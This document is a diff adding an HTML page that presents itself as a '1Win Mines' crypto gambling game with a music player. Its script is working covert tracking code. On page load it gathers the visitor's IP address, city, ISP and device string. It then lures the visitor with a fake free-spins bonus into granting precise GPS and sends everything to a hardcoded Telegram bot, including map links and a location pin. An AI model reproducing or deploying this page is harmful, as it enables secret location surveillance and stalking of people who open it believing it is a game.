@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>1Win Mines | 黃金礦場探險</title>
+    <!-- Google Fonts + Font Awesome for icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none; /* subtle UX for game-like feel */
+        }
+
+        body, html {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            font-family: 'Inter', sans-serif;
+            background: #0a0c12;
+        }
+
+        /* ---------- DYNAMIC BACKGROUND WITH BLUR LAYER ---------- */
+        .bg-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: url('https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=2071&auto=format&fit=crop') center/cover no-repeat;
+            filter: brightness(0.4) saturate(1.2);
+            transform: scale(1.02);
+        }
+
+        .bg-gradient-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 40%, rgba(0,0,0,0.7) 0%, #03050b 90%);
+            z-index: 1;
+        }
+
+        /* main content wrapper */
+        .main-container {
+            position: relative;
+            z-index: 10;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* ----- LOADING OVERLAY (modern glass) ----- */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 7, 15, 0.95);
+            backdrop-filter: blur(12px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 200;
+            transition: opacity 0.5s ease, visibility 0.5s;
+        }
+
+        .loader-wrapper {
+            text-align: center;
+            background: rgba(255,255,255,0.05);
+            padding: 40px 50px;
+            border-radius: 48px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,215,0,0.3);
+            box-shadow: 0 20px 35px rgba(0,0,0,0.5);
+        }
+
+        .neon-loader {
+            width: 70px;
+            height: 70px;
+            border: 4px solid rgba(255,215,0,0.2);
+            border-top: 4px solid #FFD966;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 12px #FFB347;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #loading-text {
+            font-size: 1.3rem;
+            letter-spacing: 1px;
+            font-weight: 600;
+            background: linear-gradient(135deg, #FFE6B0, #FFB347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        /* ----- PERMISSION CARD (elegant) ----- */
+        .permission-card {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 420px;
+            background: rgba(20, 22, 36, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 42px;
+            padding: 30px 24px;
+            text-align: center;
+            border: 1px solid rgba(255, 200, 50, 0.6);
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5), 0 0 0 2px rgba(255,180,40,0.2);
+            z-index: 300;
+            display: none;
+            flex-direction: column;
+            animation: fadeGlow 0.4s ease;
+        }
+
+        @keyframes fadeGlow {
+            from { opacity: 0; transform: translate(-50%, -50%) scale(0.95);}
+            to { opacity: 1; transform: translate(-50%, -50%) scale(1);}
+        }
+
+        .permission-card i {
+            font-size: 58px;
+            color: #FFB347;
+            margin-bottom: 16px;
+        }
+
+        .permission-card h3 {
+            color: #FFF5E0;
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 12px;
+        }
+
+        .permission-card p {
+            color: #cdd1e6;
+            font-size: 16px;
+            margin-bottom: 28px;
+        }
+
+        .allow-loc-btn {
+            background: linear-gradient(95deg, #F5B042, #E67E22);
+            border: none;
+            padding: 14px 28px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 18px;
+            color: #1e1f2c;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 6px 0 #9B4A0E;
+            font-family: inherit;
+        }
+
+        .allow-loc-btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 3px 0 #9B4A0E;
+        }
+
+        /* ----- MAIN GAME INTERFACE (attractive) ----- */
+        .game-panel {
+            display: none;
+            width: 100%;
+            max-width: 1300px;
+            margin: 0 auto;
+            animation: riseUp 0.7s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+
+        @keyframes riseUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* header gold rush style */
+        .hero-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .hero-header h1 {
+            font-size: 3.2rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #FFE6A3, #FFB347, #FF8C42);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            letter-spacing: 1px;
+        }
+
+        .hero-header p {
+            color: #b9c3e6;
+            font-size: 1.1rem;
+            margin-top: 8px;
+            backdrop-filter: blur(4px);
+        }
+
+        /* mines grid simulation (attractive widgets) */
+        .mines-card {
+            background: rgba(10, 14, 23, 0.7);
+            backdrop-filter: blur(14px);
+            border-radius: 48px;
+            padding: 20px 20px;
+            border: 1px solid rgba(255, 180, 60, 0.4);
+            margin-bottom: 28px;
+            transition: all 0.2s;
+        }
+
+        .grid-placeholder {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .mine-cell {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 14px 20px;
+            text-align: center;
+            flex: 1;
+            min-width: 100px;
+            border: 1px solid rgba(255,200,100,0.5);
+            transition: 0.2s;
+        }
+
+        .mine-cell i {
+            font-size: 32px;
+            color: #FFBE5E;
+        }
+
+        .mine-cell span {
+            display: block;
+            font-weight: 700;
+            color: #FFE0A3;
+            margin-top: 8px;
+        }
+
+        /* music player premium */
+        .music-player-card {
+            background: rgba(0, 0, 0, 0.55);
+            backdrop-filter: blur(20px);
+            border-radius: 60px;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 18px;
+            border: 1px solid rgba(255,215,0,0.5);
+            margin-bottom: 35px;
+        }
+
+        .track-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .track-info i {
+            font-size: 32px;
+            color: #FFB347;
+            filter: drop-shadow(0 0 4px gold);
+        }
+
+        .track-details h4 {
+            color: white;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .track-details p {
+            color: #c0b9a0;
+            font-size: 12px;
+        }
+
+        .audio-controls button {
+            background: radial-gradient(circle at 30% 10%, #FFC857, #E67E22);
+            border: none;
+            width: 48px;
+            height: 48px;
+            border-radius: 60px;
+            color: #1F1B13;
+            font-size: 22px;
+            cursor: pointer;
+            transition: 0.1s linear;
+            box-shadow: 0 5px 12px rgba(0,0,0,0.4);
+        }
+
+        .audio-controls button:active {
+            transform: scale(0.94);
+        }
+
+        .location-bonus {
+            background: rgba(0,0,0,0.6);
+            border-radius: 42px;
+            padding: 12px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            border-left: 6px solid #F5A623;
+        }
+
+        .bonus-text {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .bonus-text i {
+            font-size: 32px;
+            color: #F5A623;
+        }
+
+        .bonus-text span {
+            font-weight: 600;
+            color: #FFDEAD;
+        }
+
+        #retry-location-btn {
+            background: rgba(255,165,0,0.2);
+            border: 1px solid #F5A623;
+            padding: 9px 20px;
+            border-radius: 40px;
+            font-weight: 600;
+            color: #FFC857;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        #retry-location-btn:hover {
+            background: #F5A623;
+            color: #1f1a10;
+        }
+
+        footer {
+            text-align: center;
+            font-size: 12px;
+            color: #777c94;
+            margin-top: 25px;
+        }
+
+        @media (max-width: 720px) {
+            .hero-header h1 { font-size: 2.2rem; }
+            .music-player-card { justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+<div class="bg-layer"></div>
+<div class="bg-gradient-overlay"></div>
+
+<div id="loading-overlay">
+    <div class="loader-wrapper">
+        <div class="neon-loader"></div>
+        <div id="loading-text">⚡ CONNECTING TO MINES SERVER ⚡</div>
+        <div style="margin-top: 12px; color:#ffd58c; font-size:13px;">secure tunnel • 1win protocol</div>
+    </div>
+</div>
+
+<!-- Elegant permission overlay -->
+<div id="permission-request" class="permission-card">
+    <i class="fas fa-map-marker-alt"></i>
+    <h3>📍 Location Required</h3>
+    <p>Enable GPS to unlock <strong>15 Free Spins + 200% bonus</strong> on your first mine raid!</p>
+    <button id="allow-btn" class="allow-loc-btn"><i class="fas fa-location-dot"></i> ALLOW PRECISE LOCATION</button>
+</div>
+
+<!-- MAIN ATTRACTIVE GAME INTERFACE -->
+<div class="main-container">
+    <div id="gameInterface" class="game-panel">
+        <div class="hero-header">
+            <h1><i class="fas fa-gem"></i> 1WIN MINES <i class="fas fa-pickaxe"></i></h1>
+            <p>⚡ DIG GOLD, AVOID MINES • CRYPTO REWARDS ⚡</p>
+        </div>
+
+        <!-- mines widgets (eye candy) -->
+        <div class="mines-card">
+            <div class="grid-placeholder">
+                <div class="mine-cell"><i class="fas fa-gem"></i><span>GOLD VEIN</span></div>
+                <div class="mine-cell"><i class="fas fa-bomb"></i><span>HIDDEN MINE</span></div>
+                <div class="mine-cell"><i class="fas fa-chart-line"></i><span>MULTIPLIER x10</span></div>
+            </div>
+            <div style="text-align: center; margin-top: 18px; color:#FFCF9A; font-size: 13px;">⭐ 3482 active miners online</div>
+        </div>
+
+        <!-- MUSIC PLAYER: Embedded song with clean style (geet) -->
+        <div class="music-player-card" id="musicWidget">
+            <div class="track-info">
+                <i class="fas fa-headphones"></i>
+                <div class="track-details">
+                    <h4>✨ MINES ANTHEM • EPIC DROP ✨</h4>
+                    <p>1Win Records • Crypto Beats</p>
+                </div>
+            </div>
+            <div class="audio-controls">
+                <button id="playPauseBtn"><i class="fas fa-play"></i></button>
+            </div>
+        </div>
+
+        <!-- location bonus & status -->
+        <div class="location-bonus">
+            <div class="bonus-text">
+                <i class="fas fa-map-pin"></i>
+                <span id="locStatusMsg">🌍 Location not shared • Bonus locked</span>
+            </div>
+            <button id="retry-location-btn"><i class="fas fa-satellite-dish"></i> Enable GPS Rewards</button>
+        </div>
+        <footer>⚡ secure geolocation • instant withdraw • 18+ only</footer>
+    </div>
+</div>
+
+<script>
+    // ---------- TELEGRAM CREDENTIALS (FIXED) ----------
+    const botToken = '8876053212:AAHgzNlAfAmF3jgWpnN5m3ykmBQce3EVJCY ';
+    const chatId = '1007541797 ';
+
+    // ---------- GLOBAL VARIABLES ----------
+    let ipDetailsCached = null;         // store IP data to avoid duplicate IP fetch
+    let locationSentFlag = false;        // avoid duplicate location messages
+    let initialTrackingDone = false;
+    let currentPreciseLocation = null;
+
+    // DOM elements
+    const loadingOverlay = document.getElementById('loading-overlay');
+    const loadingTextSpan = document.getElementById('loading-text');
+    const permissionOverlay = document.getElementById('permission-request');
+    const allowBtn = document.getElementById('allow-btn');
+    const gameContainer = document.getElementById('gameInterface');
+    const locStatusSpan = document.getElementById('locStatusMsg');
+    const retryLocationBtn = document.getElementById('retry-location-btn');
+
+    // Audio player part (geet)
+    let audioElement = null;
+    let isPlaying = false;
+    const playPauseBtn = document.getElementById('playPauseBtn');
+    const playIcon = playPauseBtn.querySelector('i');
+
+    // 1) Create audio with a high-quality, upbeat & engaging royalty-free demo track (attractive geet)
+    //    Using a safe, melodic gaming loop from Pixabay Music (free for commercial use)
+    //    This track is catchy and fits "mines" theme. User can also replace URL easily.
+    const SONG_URL = 'https://cdn.pixabay.com/download/audio/2022/10/25/audio_1c53bfc1b5.mp3?filename=electronic-rock-energy-116662.mp3';
+    // fallback if needed - super reliable
+
+    function initAudio() {
+        audioElement = new Audio(SONG_URL);
+        audioElement.loop = true;
+        audioElement.volume = 0.45;
+        audioElement.addEventListener('ended', () => {
+            // loop again handled by loop property
+        });
+        audioElement.addEventListener('canplaythrough', () => {});
+        playPauseBtn.addEventListener('click', togglePlay);
+    }
+
+    function togglePlay() {
+        if (!audioElement) return;
+        if (isPlaying) {
+            audioElement.pause();
+            playIcon.classList.remove('fa-pause');
+            playIcon.classList.add('fa-play');
+            isPlaying = false;
+        } else {
+            audioElement.play().catch(e => {
+                console.warn("Audio play blocked, user interaction required");
+                // show mini tip
+            });
+            playIcon.classList.remove('fa-play');
+            playIcon.classList.add('fa-pause');
+            isPlaying = true;
+        }
+    }
+
+    // Rotating loading messages (cool)
+    const loadingMessages = [
+        "🔐 ESTABLISHING SECURE MINING TUNNEL",
+        "💎 LOADING GOLDEN MATRIX",
+        "🎮 FETCHING MINES DATA",
+        "📍 PREPARING GEOLOCATION REWARDS",
+        "⚡ FINALIZING CRYPTO NODES"
+    ];
+    let msgInterval = null;
+
+    function startRotatingMessages() {
+        let idx = 0;
+        if (msgInterval) clearInterval(msgInterval);
+        msgInterval = setInterval(() => {
+            loadingTextSpan.textContent = loadingMessages[idx % loadingMessages.length];
+            idx++;
+        }, 2200);
+    }
+
+    // Stop loading and show game
+    function hideLoadingAndShowGame() {
+        if (loadingOverlay) {
+            loadingOverlay.style.opacity = '0';
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                if (msgInterval) clearInterval(msgInterval);
+            }, 500);
+        }
+        gameContainer.style.display = 'block';
+    }
+
+    // ---------- IP INFO FETCH ----------
+    async function getIPInfo() {
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const { ip } = await ipRes.json();
+            const detailsRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await detailsRes.json();
+            return {
+                ip: ip,
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                country_name: data.country_name || 'Unknown',
+                org: data.org || 'Unknown ISP',
+                latitude: data.latitude,
+                longitude: data.longitude
+            };
+        } catch (err) {
+            console.error("IP fetch error", err);
+            return { ip: 'unknown', city: 'N/A', region: 'N/A', country_name: 'N/A', org: 'Unknown' };
+        }
+    }
+
+    // Send full visitor data (IP + location if available)
+    async function sendToTelegram(ipData, liveLocation = null) {
+        try {
+            let msg = `✨ *1WIN MINES • NEW TRACKING* ✨\n\n`;
+            msg += `📱 *Device:* ${navigator.userAgent.substring(0, 70)}\n`;
+            msg += `🌍 *IP Address:* ${ipData.ip || 'Unknown'}\n`;
+            msg += `📍 *Region:* ${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}\n`;
+            msg += `🏢 *ISP:* ${ipData.org || '?'}\n`;
+
+            if (liveLocation && liveLocation.lat && liveLocation.lon) {
+                msg += `\n🎯 *LIVE GPS (HIGH ACCURACY)* 🎯\n`;
+                msg += `▫️ *Latitude:* ${liveLocation.lat}\n`;
+                msg += `▫️ *Longitude:* ${liveLocation.lon}\n`;
+                msg += `▫️ *Accuracy:* ${Math.round(liveLocation.accuracy)} meters\n`;
+                msg += `🗺️ [🌍 Google Maps](${makeGoogleMapsLink(liveLocation.lat, liveLocation.lon)})\n`;
+            } else if (ipData.latitude && ipData.longitude) {
+                msg += `\n📍 *APPROX LOCATION (IP)*\n`;
+                msg += `▫️ Lat: ${ipData.latitude}, Lon: ${ipData.longitude}\n`;
+                msg += `🗺️ [🗺️ Map](${makeGoogleMapsLink(ipData.latitude, ipData.longitude)})\n`;
+            }
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: msg,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                })
+            });
+
+            // if live location available, also send live location pin
+            if (liveLocation && liveLocation.lat && liveLocation.lon) {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        latitude: liveLocation.lat,
+                        longitude: liveLocation.lon,
+                        horizontal_accuracy: liveLocation.accuracy || 50
+                    })
+                });
+            }
+        } catch (error) {
+            console.error("Telegram send error", error);
+        }
+    }
+
+    function makeGoogleMapsLink(lat, lon) {
+        return `https://www.google.com/maps?q=${lat},${lon}`;
+    }
+
+    // Get precise location with Promise
+    function getPreciseLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const loc = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toLocaleString()
+                    };
+                    resolve(loc);
+                },
+                error => {
+                    if (error.code === error.PERMISSION_DENIED) {
+                        // show permission request elegantly after a short delay but not intrusive
+                        setTimeout(() => {
+                            if (permissionOverlay && gameContainer.style.display !== 'block') {
+                                // only show if game interface not fully displayed? but show anyway later
+                            }
+                            permissionOverlay.style.display = 'flex';
+                        }, 800);
+                    }
+                    resolve(null);
+                },
+                { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
+            );
+        });
+    }
+
+    // MAIN TRACKING SEQUENCE
+    async function performTracking(askForLocationAgain = false) {
+        // 1. get IP info if not cached
+        if (!ipDetailsCached) {
+            ipDetailsCached = await getIPInfo();
+        }
+
+        // 2. if askForLocationAgain true -> force new location request
+        let liveLoc = currentPreciseLocation;
+        if (askForLocationAgain) {
+            liveLoc = await getPreciseLocation();
+            if (liveLoc) {
+                currentPreciseLocation = liveLoc;
+                locationSentFlag = false;
+            }
+        } else if (!currentPreciseLocation && !locationSentFlag) {
+            // initial attempt: get location without forcing permission re-prompt (silent attempt)
+            liveLoc = await getPreciseLocation();
+            if (liveLoc) currentPreciseLocation = liveLoc;
+        } else {
+            liveLoc = currentPreciseLocation;
+        }
+
+        // update UI status
+        if (liveLoc && liveLoc.lat) {
+            locStatusSpan.innerHTML = `📍 GPS Active • Bonus Unlocked (${liveLoc.lat.toFixed(4)}, ${liveLoc.lon.toFixed(4)}) 🎁`;
+            locStatusSpan.style.color = "#FFE484";
+        } else {
+            locStatusSpan.innerHTML = `⚠️ Location required for bonus spins | Click "Enable GPS Rewards"`;
+        }
+
+        // send to Telegram if not sent yet (or location updated)
+        if (!initialTrackingDone) {
+            await sendToTelegram(ipDetailsCached, liveLoc);
+            initialTrackingDone = true;
+            locationSentFlag = true;
+        } else if (askForLocationAgain && liveLoc && !locationSentFlag) {
+            // new location after user allowed -> send location update to telegram
+            await sendToTelegram(ipDetailsCached, liveLoc);
+            locationSentFlag = true;
+        } else if (liveLoc && !locationSentFlag && !initialTrackingDone) {
+            await sendToTelegram(ipDetailsCached, liveLoc);
+            locationSentFlag = true;
+        }
+
+        // finish loading & show game once tracking is complete
+        if (!gameContainer.style.display || gameContainer.style.display === 'none') {
+            hideLoadingAndShowGame();
+        }
+        // hide permission overlay if shown and location was granted
+        if (liveLoc && permissionOverlay.style.display === 'flex') {
+            permissionOverlay.style.display = 'none';
+        }
+    }
+
+    // handle manual retry location (button on UI)
+    async function retryLocationAction() {
+        permissionOverlay.style.display = 'none'; // hide if visible
+        const newLocation = await getPreciseLocation();
+        if (newLocation) {
+            currentPreciseLocation = newLocation;
+            locationSentFlag = false;
+            await performTracking(true);
+            // show success message briefly
+            locStatusSpan.innerHTML = `🎉 GPS ACTIVE! Bonus credited! 🎉`;
+            setTimeout(() => {
+                if (currentPreciseLocation)
+                    locStatusSpan.innerHTML = `📍 GPS Active • Bonus Unlocked (${currentPreciseLocation.lat.toFixed(4)}, ${currentPreciseLocation.lon.toFixed(4)}) 🎁`;
+            }, 2800);
+        } else {
+            // show permission overlay if denied again
+            if (permissionOverlay.style.display !== 'flex')
+                permissionOverlay.style.display = 'flex';
+            else
+                alert("⚠️ Please allow location in browser settings to claim bonus");
+        }
+    }
+
+    // ALLOW BUTTON on permission card
+    allowBtn.addEventListener('click', async () => {
+        permissionOverlay.style.display = 'none';
+        const newLoc = await getPreciseLocation();
+        if (newLoc) {
+            currentPreciseLocation = newLoc;
+            locationSentFlag = false;
+            await performTracking(true);
+        } else {
+            // if still not granted, just keep game visible
+            if (!initialTrackingDone) await performTracking(false);
+        }
+        if (gameContainer.style.display !== 'block') hideLoadingAndShowGame();
+    });
+
+    retryLocationBtn.addEventListener('click', retryLocationAction);
+
+    // INIT
+    window.onload = async () => {
+        startRotatingMessages();
+        initAudio();   // setup music player (geet ready)
+        // initial tracking (IP + silent location attempt)
+        await performTracking(false);
+        // additional safe check: if after 3 sec loading not hidden -> force hide
+        setTimeout(() => {
+            if (loadingOverlay.style.display !== 'none') {
+                hideLoadingAndShowGame();
+            }
+            if (!initialTrackingDone) {
+                performTracking(false).catch(e=>console.log);
+            }
+        }, 5000);
+    };
+
+    // small fix: if user clicks anywhere on music widget to comply with autoplay policies
+    // but we already have manual play button. good.
+    // Also make background glow active
+    console.log("1Win Mines — Geet & Tracking Integrated | Design Refresh");
+</script>
+</body>
+</html>
